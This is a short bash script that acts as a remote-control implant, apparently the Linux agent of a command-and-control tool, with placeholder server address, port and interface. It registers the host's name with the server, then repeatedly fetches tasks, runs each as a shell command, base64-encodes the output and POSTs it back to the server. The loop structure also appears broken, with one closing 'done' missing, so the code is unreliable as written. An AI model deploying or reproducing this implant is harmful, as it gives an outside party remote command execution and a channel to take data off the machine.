#!/bin/bash
ip="REPLACE_IP"
port="REPLACE_PORT"
interface="REPLACE_INTERFACE"
n=.3

regl="http://$ip:$port/reg/"

declare -A data=( [eth]=$interface [hname]=$(hostname) )

name=$(curl -X POST -F eth=$interface -F hname=$(hostname) $regl) 

taskl="http://$ip:$port/tasks/$name/"
resultl="http://$ip:$port/Lin-results/$name/"

while :
do  
    tasks=$(curl $taskl)
    splittasks=$(echo $tasks | tr ";" "\n")
    for task in $splittasks
    do
        echo $($task|base64) >> /tmp/result
    curl -X POST --data "@/tmp/result" $resultl
    sleep $n
    rm /tmp/result
done